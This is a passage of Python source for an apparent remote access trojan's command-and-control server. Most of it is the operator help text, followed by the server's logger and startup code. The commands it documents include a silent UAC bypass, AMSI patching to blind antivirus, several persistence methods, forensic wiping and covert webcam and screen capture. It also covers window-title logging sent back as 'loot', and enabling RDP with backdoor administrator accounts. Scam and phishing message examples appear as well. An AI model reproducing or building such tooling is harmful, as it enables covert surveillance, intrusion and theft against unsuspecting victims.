{Y}╔══════════════════════════════════════╗
║        PRIVILEGE & EVASION           ║
╚══════════════════════════════════════╝{W}
  {G}elevate{W}              Request UAC elevation (triggers Windows UAC prompt).
                       If accepted, re-spawns the RAT as Administrator.
  {G}uac <program>{W}        Silent UAC bypass via fodhelper.exe (no UAC prompt shown).
                       Runs the given program as Administrator without confirmation.
                       Ex: uac "C:\\Temp\\payload.exe"
  {G}amsi{W}                 Patch AMSI in ntdll — makes AV/EDR blind to subsequent ops.
  {G}persist{W}              Install multi-vector persistence:
                       Windows: Registry Run key + Startup VBS + Scheduled Task
                       Linux: systemd user service + XDG autostart .desktop file
                       macOS: LaunchAgent plist
                       Also launches a shadow copy that survives parent process death.
  {G}unpersist{W}            Remove all persistence mechanisms and delete the shadow copy.
  {G}wmi <command>{W}        Install WMI Event Subscription persistence (stealthiest method).
                       Triggers hourly via Win32_LocalTime WMI event. [Admin required]
                       Ex: wmi "C:\\Windows\\System32\\WindowsPowerShell\\...\\powershell.exe"
  {G}clean{W}                Wipe forensic evidence: PowerShell history, Recent files,
                       bash/zsh history, Python history, temp files.
  {G}destroy{W}              Full self-destruct: clean traces, then delete the RAT binary
                       and launch script via a delayed batch/shell script.
  {G}abort [id]{W}           Kill a running task by ID, or abort all active tasks.
                       Ex: abort  or  abort a1b2c3d4

{Y}╔══════════════════════════════════════╗
║        REMOTE INTERACTION            ║
╚══════════════════════════════════════╝{W}
  {G}url <url>{W}            Force the victim's default browser to open a URL.
                       Ex: url https://phishing.site/login
  {G}msg <text>{W}           Pop a message box on the victim's screen.
                       Ex: msg "Your PC is infected. Call 1-800-SCAM"
  {G}wallpaper <path>{W}     Change the victim's desktop wallpaper to a local image path.
                       Ex: wallpaper C:\\Temp\\ransom.jpg
  {G}input move <x> <y>{W}  Move the victim's mouse cursor to screen coordinates (x, y)
  {G}input click <x> <y>{W} Move and left-click at (x, y)
  {G}input rclick <x> <y>{W} Move and right-click at (x, y)
  {G}input type <text>{W}   Type text using virtual key events on the victim's keyboard
  {G}block on{W}             Block all victim mouse+keyboard input. [Admin required]
  {G}block off{W}            Restore victim input.
  {G}stream start [fps] [h] [q]{W} Start live SCREEN stream.
                       Default 15 FPS, 480p, quality 30. 
                       Ex: stream start 30 720 50 (30FPS, 720p, 50% quality)
  {G}stream stop{W}          Stop the screen stream.
  {G}recstream start [s]{W}   Start recording screen stream. Optional seconds.
  {G}recstream stop{W}       Stop screen recording and flush the video file.
  {G}wcam start [fps] [res] [q]{W} Start live WEBCAM stream.
                       Default 10 FPS, 640x480, quality 50.
                       Ex: wcam start 20 1280x720 80
  {G}wcam stop{W}            Stop the webcam stream.
                       Useful before live cookie extraction to release locked DB files.
  {G}autorun <json>{W}       Set commands that auto-execute on victim reconnect.
                       Pass a JSON array of command objects.
                       Ex: autorun '[{{"type":"keylog","action":"dump"}}]'

{C}{'='*70}{W}
{Y}NEW FEATURES — FULL DETAIL{W}
{C}{'='*70}{W}

{M}▶ WEBCAM STREAM  (wcam){W}
  Streams live video from the victim's webcam to an OpenCV window on this
  server. Uses DirectShow backend on Windows for faster init. Warms camera
  with 20 frames to avoid black-image issues. Downscales to 480p to save
  bandwidth. Sends JPEG frames independently from the screen stream, so
  both can run simultaneously.

  {G}wcam{W}                 Start webcam stream at default 10 FPS, 480p
  {G}wcam start <fps> [res]{W} Start at custom FPS and resolution (e.g. 1280x720)
                       Ex: wcam start 20 1280x720
  {G}wcam stop{W}            Stop the stream (also press 'q' in the OpenCV window)

  Notes:
  • A separate OpenCV window titled "Webcam Stream - <id>" opens on this server
  • Press 'q' in the window to send a remote stop command automatically
  • Uses cv2.VideoCapture(0) — only captures the first/default camera
  • Works cross-platform: Windows (CAP_DSHOW), Linux/macOS (CAP_ANY)

{M}▶ WINDOW ACTIVITY LOGGER  (wlog){W}
  Runs a silent background thread on the victim that polls the foreground
  window title every N seconds and records EVERY CHANGE with a timestamp.
  Perfect complement to the keylogger — you can see what app the victim
  was using when they typed each line, e.g.:
    [14:22:10] Chrome — Instagram · DMs
    [14:22:45] KeePass 2.x — Password Database

  This gives full typing context without needing to parse keylog dumps.

  {G}wlog{W}                 Start logger with 1-second poll interval
  {G}wlog start <sec>{W}     Start with custom interval in seconds (float allowed)
                       Ex: wlog start 0.5   (poll every 500ms for high fidelity)
  {G}wlog stop{W}            Stop the background polling thread gracefully
  {G}wlog dump{W}            Exfiltrate the entire buffer as a timestamped .txt file
                       Saved to loot/window_log/ on this server
                       Ex output line:  [2026-03-21 14:22:10] Google Chrome - Gmail
  {G}wlog clear{W}           Wipe the in-memory buffer without sending it
                       Useful to start a clean observation window

  Notes:
  • Windows: uses GetForegroundWindow + GetWindowTextW (no extra dependencies)
  • Linux: requires xdotool (apt install xdotool)
  • macOS: uses osascript AppleScript
  • Buffer capped at 5,000 entries to prevent memory bloat
  • Run wlog start BEFORE keylog dump sessions for maximum intel

{M}▶ ENABLE RDP  (rdp){W}
  Silently enables Remote Desktop Protocol on the victim machine by:
    1. Writing fDenyTSConnections = 0 to HKLM\\SYSTEM\\...\\Terminal Server
    2. Disabling NLA (Network Level Auth) so any RDP client can connect
    3. Adding a Windows Firewall rule: allow inbound TCP 3389 from any profile
    4. Optionally creating a backdoor local Administrator account

  After running, you can immediately connect with:
    mstsc /v:<victim_ip>:3389   (Windows Remote Desktop)
    rdesktop <victim_ip> -u <user> -p <pass>   (Linux)
    xfreerdp /v:<victim_ip> /u:<user> /p:<pass>  (Linux, better)

  Result also prints all detected LAN IPs of the victim for convenience.

  {G}rdp{W}                  Enable RDP + firewall rule only (use existing victim accounts)
  {G}rdp adduser{W}          Enable RDP + create local admin: svcadmin / P@ssw0rd!
  {G}rdp adduser <u> <p>{W}  Enable RDP + create custom backdoor account
                       Ex: rdp adduser hacker R00t!2024
                       Creates the user, adds to Administrators group,
                       and adds to Remote Desktop Users group.

  Notes:
  • [Admin required] — Run 'elevate' or 'uac' first if not already admin
  • NLA is disabled so mstsc works even without domain credentials
  • The firewall rule is named "Remote Desktop - User Mode (TCP-In)"
  • Backdoor account persists until manually removed with 'net user <u> /delete'
  • For stealth: use 'clean' after your RDP session to wipe event logs

{M}▶ SERVER-SIDE RECORDING  (recstream / recwcam){W}
  Enables recording of the live screen or webcam streams directly to the
  server's disk. This feature is processed entirely on the C2 server,
  meaning it uses NO additional bandwidth or CPU on the victim's machine.
  It simply intercepts the frames already being sent for live display.

  {G}recstream start [s]{W}  Start recording the screen stream (optional [s]econds)
  {G}recstream stop{W}       Stop screen recording and save the file
  {G}recwcam start [s]{W}   Start recording the webcam stream (optional [s]econds)
  {G}recwcam stop{W}        Stop webcam recording and save the file
  {G}recstream status{W}     Check if recording is active and get the file path

  Notes:
  • Videos are saved as MP4 files in 'loot/recordings/'
  • FPS is fixed at 15 for the recording to maintain sync
  • You can start/stop recording while the live window is open
  • Closing the live window ('q') does NOT automatically stop recording
  • Specify seconds to auto-stop: 'recstream start 60' (1 minute)
{C}{'='*70}{W}
        """)

class Logger:
    def __init__(self, f, d): self.f=f; self.d=d
    def success(self, m): self._l("OK", m, Fore.CYAN)
    def info(self, m): self._l("INFO", m, Fore.GREEN)
    def warning(self, m): self._l("WARN", m, Fore.YELLOW)
    def error(self, m): self._l("FAIL", m, Fore.RED)
    def debug(self, m): 
        if self.d: self._l("DEBUG", m, Fore.MAGENTA)
    def _l(self, l, m, c): print(f"{Fore.WHITE}[{datetime.datetime.now().strftime('%H:%M:%S')}]{Style.RESET_ALL} {c}[{l}]{Style.RESET_ALL} {m}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, default=4444)
    args = parser.parse_args()
    
    server = AdvancedC2Server(ServerConfig(port=args.port))
    try: server.start()
    except KeyboardInterrupt: sys.exit(0)

if __name__ == "__main__": main()